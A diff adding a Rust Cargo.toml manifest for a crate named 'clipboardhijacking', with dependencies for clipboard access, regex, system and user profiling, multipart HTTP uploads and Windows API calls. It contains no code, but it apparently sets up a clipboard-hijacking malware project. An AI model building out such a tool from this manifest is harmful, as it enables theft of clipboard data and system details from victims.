@@ -1,0 +1,18 @@
+[package]
+name = "clipboardhijacking"
+version = "0.1.0"
+edition = "2021"
+
+[dependencies]
+regex = "1.10.3"         # para regex
+copypasta = "0.9"
+sysinfo = "0.29.4"  ## https://docs.rs/sysinfo/latest/sysinfo/
+human_bytes = "0.4.3"   ## https://docs.rs/human_bytes/latest/human_bytes/
+whoami = "=0.9.0"  ## https://crates.io/crates/whoami/0.9.0
+
+reqwest = {version = "0.11" , features = ["blocking","multipart"]}
+serde_json = "*"
+serde = {version = "*" , features = ["derive"] }
+mime = "0.3"
+winapi = { version = "0.3", features = ["winuser", "winbase"] }
+
